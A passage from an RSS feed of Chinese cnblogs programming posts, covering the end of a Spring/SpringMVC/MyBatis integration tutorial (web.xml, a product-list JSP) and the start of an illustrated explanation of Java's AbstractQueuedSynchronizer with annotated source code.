            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;param-value&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;classpath:spring/springmvc.xml&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;param-value&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;init-param&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;load-on-startup&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;2&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;load-on-startup&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;ssm&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;/&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置ContextLoaderListener监听器加载spring父容器 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;context-param&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;param-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;contextConfigLocation&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;param-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;param-value&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;classpath:spring/applicationContext-*.xml&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;param-value&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;context-param&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 监听器 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;listener&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;listener-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework.web.context.ContextLoaderListener&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;listener-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;listener&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;web-app&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;item-list.jsp&lt;/h2&gt;
&lt;p&gt;路径：src/main/webapp/WEB-INF/jsp/item/item-list.jsp&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;%&lt;/span&gt;&lt;span&gt;@ page language&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;java&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; contentType&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/html; charset=UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    pageEncoding&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;%&lt;/span&gt;&lt;span&gt;@ taglib uri&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;http://java.sun.com/jsp/jstl/core&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; prefix&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;c&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;%&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;%&lt;/span&gt;&lt;span&gt;@ taglib uri&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;http://java.sun.com/jsp/jstl/fmt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;  prefix&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;fmt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;http-equiv&lt;/span&gt;&lt;span&gt;=&quot;Content-Type&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;查询商品列表&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; 
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;form &lt;/span&gt;&lt;span&gt;action&lt;/span&gt;&lt;span&gt;=&quot;${pageContext.request.contextPath }/itemList.do&quot;&lt;/span&gt;&lt;span&gt; method&lt;/span&gt;&lt;span&gt;=&quot;post&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
查询条件：
&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;table &lt;/span&gt;&lt;span&gt;width&lt;/span&gt;&lt;span&gt;=&quot;100%&quot;&lt;/span&gt;&lt;span&gt; border&lt;/span&gt;&lt;span&gt;=1&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tr&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span&gt;input &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;submit&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;查询&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;tr&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;table&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
商品列表：
&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;table &lt;/span&gt;&lt;span&gt;width&lt;/span&gt;&lt;span&gt;=&quot;100%&quot;&lt;/span&gt;&lt;span&gt; border&lt;/span&gt;&lt;span&gt;=1&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tr&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;商品名称&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;商品价格&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;生产日期&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;商品描述&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;操作&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;tr&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;c:forEach &lt;/span&gt;&lt;span&gt;items&lt;/span&gt;&lt;span&gt;=&quot;${itemList }&quot;&lt;/span&gt;&lt;span&gt; var&lt;/span&gt;&lt;span&gt;=&quot;item&quot;&lt;/span&gt;&lt;span&gt; varStatus&lt;/span&gt;&lt;span&gt;=&quot;status&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tr&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span&gt;input &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;itemList[${status.index }].name&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;${item.name }&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;${item.price }&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span&gt;fmt:formatDate &lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;=&quot;${item.createtime}&quot;&lt;/span&gt;&lt;span&gt; pattern&lt;/span&gt;&lt;span&gt;=&quot;yyyy-MM-dd HH:mm:ss&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;${item.detail }&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;${pageContext.request.contextPath }/itemEdit.do?id=${item.id}&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;修改&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;tr&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;c:forEach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;table&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;form&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt; 项目结构图&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1504448/201911/1504448-20191129231245428-603873475.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1504448/201911/1504448-20191129231303174-1291100489.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h2&gt; 数据库表结构&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1504448/201911/1504448-20191129231342466-1357341323.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h2&gt; 运行&lt;/h2&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/common/1504448/201911/1504448-20191129231918370-866868461.gif&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt; 项目源码&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://files-cdn.cnblogs.com/files/chenyanbin/ssm-project.rar&quot; target=&quot;_blank&quot;&gt;直接下载&lt;/a&gt;&lt;/p&gt;



</description>
<pubDate>Fri, 29 Nov 2019 15:33:00 +0000</pubDate>
<dc:creator>陈彦斌</dc:creator>
<og:description>整合思路 将工程的三层结构中的JavaBean分别使用Spring容器(通过XML方式)进行管理。 整合持久层mapper，包括数据源、会话工程及mapper代理对象的整合； 整合业务层Service</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/chenyanbin/p/11950761.html</dc:identifier>
</item>
<item>
<title>图解AQS的设计与实现，手摸手带你实现一把互斥锁！ - 浪人~</title>
<link>http://www.cnblogs.com/liqiangchn/p/11960944.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/liqiangchn/p/11960944.html</guid>
<description>&lt;p&gt;AQS是并发编程中非常重要的概念，它是juc包下的许多并发工具类，如CountdownLatch，CyclicBarrier，Semaphore 和锁, 如ReentrantLock， ReaderWriterLock的实现基础，提供了一个基于int状态码和队列来实现的并发框架。本文将对AQS框架的几个重要组成进行简要介绍，读完本文你将get到以下几个点：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;AQS进行并发控制的机制是什么&lt;/li&gt;
&lt;li&gt;共享模式和独占模式获取和释放同步状态的详细过程&lt;/li&gt;
&lt;li&gt;基于AQS框架实现一个简易的互斥锁&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;一aqs基本概念&quot;&gt;一，AQS基本概念&lt;/h2&gt;
&lt;p&gt;AQS（AbstractQueuedSynchronizer）是用来构建锁或者其他同步组件的基础框架，它使用了一个int成员变量来表示状态，通过内置的FIFO（first in，first out）队列来完成资源获取线程的排队工作。&lt;/p&gt;
&lt;h3 id=&quot;同步状态&quot;&gt;1.1 同步状态&lt;/h3&gt;
&lt;p&gt;AQS中维持一个全局的int状态码（state），线程通过修改（加/减指定的数量）码是否成功来决定当前线程是否成功获取到同步状态。&lt;/p&gt;
&lt;h3 id=&quot;独占or共享模式&quot;&gt;1.1 独占or共享模式&lt;/h3&gt;
&lt;p&gt;AQS支持两种获取同步状态的模式既独占式和共享式。顾名思义，独占式模式同一时刻只允许一个线程获取同步状态，而共享模式则允许多个线程同时获取。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233117600-2113769929.jpg&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;同步队列&quot;&gt;1.2 同步队列&lt;/h3&gt;
&lt;p&gt;同步队列（一个FIFO双向队列）是AQS的核心，用来完成同步状态的管理，当线程获取同步状态失败时，AQS会将当前线程以及等待状态等信息构造成一个节点并加入到同步队列，同时会阻塞当前线程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233118009-1456342769.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;二独占模式获取与释放状态&quot;&gt;二，独占模式获取与释放状态&lt;/h2&gt;
&lt;p&gt;独占模式既同一时间只能由一个线程持有同步状态。当多个线程竞争时(acquire)，获取到同步状态的线程会将当前线程赋值给&lt;code&gt;Thread exclusiveOwnerThread&lt;/code&gt;属性（AQS父类中）来标记当前状态被线程独占。其他线程将被构造成Node加入到同步队列中。当线程l&lt;/p&gt;
&lt;h3 id=&quot;获取同步状态&quot;&gt;2.1 获取同步状态&lt;/h3&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
 * 获取同步状态
 */
public final void acquire(int arg) {
    /**
     * 1. tryAcquire    尝试获取同步状态; 
     * 2.1 addWaiter     如果尝试获取到同步状态失败，则加入到同步队列中; 
     * 2.2 acquireQueued 在队列中尝试获取同步状态.
     */
    if (!tryAcquire(arg) &amp;amp;&amp;amp;
        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))
        selfInterrupt();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ol readability=&quot;8.5&quot;&gt;&lt;li readability=&quot;7&quot;&gt;
&lt;p&gt;多线程并发获取（修改）同步状态, 修改同步状态成功的线程标记为拥有同步状态&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233118430-1256054001.png&quot;/&gt;&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
 * 尝试获取同步状态【子类中实现】，因为aqs基于模板模式，仅提供基于状态和同步队列的实 
 * 现框架，具体的实现逻辑由子类决定
 */
protected final boolean tryAcquire(int acquires) {
    final Thread current = Thread.currentThread();
    int c = getState();
    if (c == 0) {
        // a. 尝试修改状态值操作执行成功
        if (!hasQueuedPredecessors() &amp;amp;&amp;amp;
            compareAndSetState(0, acquires)) {
            // b. 修改状态值成功，记录当前持有同步状态的线程信息
            setExclusiveOwnerThread(current);
            return true;
        }
        // 如果当前线程已经持有同步状态，继续修改同步状态【重入锁实现原理，不理解可以先忽略】
    } else if (current == getExclusiveOwnerThread()) {
        int nextc = c + acquires;
        if (nextc &amp;lt; 0)
            throw new Error(&quot;Maximum lock count exceeded&quot;);
        setState(nextc);
        return true;
    }
    return false;
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;10&quot;&gt;
&lt;p&gt;获取失败的线程，加入到同步队列的队尾；加入到队列中后，如果当前节点的前驱节点为头节点再次尝试获取同步状态（下文代码：p == head &amp;amp;&amp;amp; tryAcquire(arg)）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233118771-1689741253.png&quot;/&gt;&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
 * 没有获取到同步状态的线程加入到队尾部
 */
private Node addWaiter(Node mode) {
    Node node = new Node(Thread.currentThread(), mode);
    // 尝试用最快的方式入队，如果入队失败，再走完整的入队方法
    Node pred = tail;
    if (pred != null) {
        node.prev = pred;
        // 将当前线程设置到队尾
        if (compareAndSetTail(pred, node)) {
            pred.next = node;
            return node;
        }
    }
    // 正常的入队方法
    enq(node);
    return node;
}

/**
 * 同步队列中节点，尝试获取同步状态
 */
final boolean acquireQueued(final Node node, int arg) {
    boolean failed = true;
    try {
        boolean interrupted = false;
        // 自旋(死循环)
        for (;;) {
         // 只有当前节点的前驱节点是头节点时才会尝试执行获取同步状态操作
            final Node p = node.predecessor();
            if (p == head &amp;amp;&amp;amp; tryAcquire(arg)) {
                setHead(node);// 注意： 此处重点， 当前节点设置为头节点，相当于头节点出队
                p.next = null; // help GC
                failed = false;
                return interrupted;
            }
            // 获取失败后是否进入wait
            if (shouldParkAfterFailedAcquire(p, node) &amp;amp;&amp;amp;
                parkAndCheckInterrupt())
                interrupted = true;
        }
    } finally {
        if (failed)
            cancelAcquire(node);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ol&gt;&lt;li&gt;如果头节点的下一个节点尝试获取同步状态失败后，会进入等待状态；其他节点则继续自旋。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233119143-1476789162.png&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 伪代码
final boolean acquireQueued(final Node node, int arg) {
    for (;;) {
        // -------获取同步状态失败-------
      
        // 获取失败后是否进入wait
        if (shouldParkAfterFailedAcquire(p, node) &amp;amp;&amp;amp;
            parkAndCheckInterrupt())
            interrupted = true;
    }
 
}
/**
 * 当获取同步状态失败后是否进入park状态
 */
private static boolean shouldParkAfterFailedAcquire(Node pred, Node node) {
    int ws = pred.waitStatus;
    // 前驱节点为唤醒状态，返回true【后面代码暂时可以忽略】
    if (ws == Node.SIGNAL)
        return true;
    if (ws &amp;gt; 0) {
        do {
            node.prev = pred = pred.prev;
        } while (pred.waitStatus &amp;gt; 0);
        pred.next = node;
    } else {
        compareAndSetWaitStatus(pred, ws, Node.SIGNAL);
    }
    return false;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ol readability=&quot;-2&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;独占模式获取同步状态总结&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233119985-476209714.png&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;释放同步状态&quot;&gt;2.2 释放同步状态&lt;/h3&gt;
&lt;p&gt;当线程执行完相应逻辑后，需要释放同步状态，使后继节点有机会同步状态（让出资源，让排队的线程使用）。这时就需要调用release(int arg)方法。调用该方法后，会唤醒后继节点。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;释放同步状态，唤醒后继节点&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233120861-935232279.png&quot;/&gt;&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
 * 释放同步状态
 */
public final boolean release(int arg) {
    // 1. 尝试释放同步状态
    if (tryRelease(arg)) {
        Node h = head;
        // 释放成功后，执行unpark，既唤醒操作（暂时可忽略waitStatus，涉及到条件队列）
        if (h != null &amp;amp;&amp;amp; h.waitStatus != 0)
            unparkSuccessor(h);
        return true;
    }
    return false;
}     
/**
 * 尝试释放同步状态，既将同步状态减去指定的值
 * 如果state = 0，表示当前线程  获取次数 = 释放次数，既释放成功，此时将持有同步状态线程标志为null
 */
protected final boolean tryRelease(int releases) {
    int c = getState() - releases;
    if (Thread.currentThread() != getExclusiveOwnerThread())
        throw new IllegalMonitorStateException();
    boolean free = false;
    // 状态码=0，表示释放成功了
    if (c == 0) {
        free = true;
        // 独占标志设置为null
        setExclusiveOwnerThread(null);
    }
    setState(c);
    return free;
}
/**
  * 唤醒后继节点操作
  */
private void unparkSuccessor(Node node) {
    int ws = node.waitStatus;
    if (ws &amp;lt; 0)
        compareAndSetWaitStatus(node, ws, 0);
    // 获取后继节点
    Node s = node.next;
    if (s == null || s.waitStatus &amp;gt; 0) {
        s = null;
        for (Node t = tail; t != null &amp;amp;&amp;amp; t != node; t = t.prev)
            if (t.waitStatus &amp;lt;= 0)
                s = t;
    }
    // 唤醒后继节点
    if (s != null)
        LockSupport.unpark(s.thread);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ol readability=&quot;-1&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;后继节点获取同步状态成功，头节点出队。需要注意的事，出队操作是间接的，有节点获取到同步状态时，会将当前节点设置为head，而原本的head设置为null。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233121530-1946057717.png&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
 * 同步队列中节点，尝试获取同步状态（伪代码）
 * 获取成功后，当前节点设置为头节点，头节点设置为null，既头节点出队
 */
final boolean acquireQueued(final Node node, int arg) {
    try {
        // 自旋(死循环)
        for (;;) {
            if (p == head &amp;amp;&amp;amp; tryAcquire(arg)) {
                // a. 操作：当前节点设置为头节点，当前节点的前驱节点设置为null
                setHead(node);
                // b. 原始的head的next设置为null，此时原始的head已经被移出队列
                p.next = null; // help GC
                failed = false;
                return interrupted;
            }
        }
    }
}
/**
 * a.当前节点设置为头节点，当前节点的前驱节点设置为null
 */
private void setHead(Node node) {
    head = node;
    node.thread = null;
    node.prev = null;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;其他竞争情况&quot;&gt;2.3 其他竞争情况&lt;/h3&gt;
&lt;ol readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;当同步队列中头节点唤醒后继节点时，此时可能有其他线程尝试获取同步状态。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233122487-1148152296.png&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;假设获取成功，将会被设置为头节点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233123222-2111205037.png&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;头节点后续节点获取同步状态失败。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233124139-1541007549.png&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
